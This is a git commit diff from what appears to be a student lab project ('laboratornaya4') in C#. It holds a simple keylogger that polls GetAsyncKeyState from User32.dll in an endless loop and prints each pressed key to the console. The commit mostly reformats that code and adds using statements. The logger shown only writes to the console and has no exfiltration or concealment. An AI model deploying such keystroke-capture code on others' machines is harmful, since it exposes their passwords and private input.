ceb4af8d0d8f3800ceae327019c2aa67d0bdd95e
NguyenMinh222 <pandafx@tut.by>
2021-05-13 11:27:38 +0300

    laboratornaya4

--- 4LAB/LAB4(2)/LAB4(2)/Program.cs
+++ 4LAB/LAB4(2)/LAB4(2)/Program.cs
@@ -1,4 +1,11 @@
 ﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Threading;
 using Key;
 namespace LAB4_2_
 {
--- 4LAB/Mylibrary/Mylibrary/Class1.cs
+++ 4LAB/Mylibrary/Mylibrary/Class1.cs
@@ -2,41 +2,45 @@
 using System;
 using System.Runtime.InteropServices;
 using System.Threading;
-
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
 namespace Key
 {
     public static class Log
     {
-        [DllImport("User32.dll")]
+        [DllImport("User32.dll", CallingConvention = CallingConvention.StdCall)]
         public static extern int GetAsyncKeyState(Int32 i);
         public static void Main()
         {
-            while (true)
-            {
-                Thread.Sleep(150);
-                for (int i = 8; i < 127; i++)
+                while (true)
                 {
-                    int key = GetAsyncKeyState(i);
-                    if (key != 0)
+                    Thread.Sleep(150);
+                    for (int i = 8; i < 127; i++)
                     {
-                        Console.WriteLine((char)i);
-                        switch (i)
+                        int key = GetAsyncKeyState(i);
+                        if (key != 0)
                         {
-                            case 8: Console.WriteLine("{backspace}"); break;
-                            case 9: Console.WriteLine("{TAB}"); break;
-                            case 27: Console.WriteLine("{escape}"); break;
-                            case 32: Console.WriteLine("{Space}"); break;
-                            case 46: Console.WriteLine("{delete}"); break;
-                            case 20: Console.WriteLine("{caps lock}"); break;
-                            case 17: Console.WriteLine("{ctrl}"); break;
-                            case 18: Console.WriteLine("{alt}"); break;
-                            case 13: Console.WriteLine("{enter}"); break;
-                            case 16: Console.WriteLine("{shift}"); break;
+                            Console.WriteLine((char)i);
+                            switch (i)
+                            {
+                                case 8: Console.WriteLine("{backspace}"); break;
+                                case 9: Console.WriteLine("{TAB}"); break;
+                                case 27: Console.WriteLine("{escape}"); break;
+                                case 32: Console.WriteLine("{Space}"); break;
+                                case 46: Console.WriteLine("{delete}"); break;
+                                case 20: Console.WriteLine("{caps lock}"); break;
+                                case 17: Console.WriteLine("{ctrl}"); break;
+                                case 18: Console.WriteLine("{alt}"); break;
+                                case 13: Console.WriteLine("{enter}"); break;
+                                case 16: Console.WriteLine("{shift}"); break;
+                            }
                         }
-                    }
 
+                    }
                 }
-            }
+            
         }
     }
 }
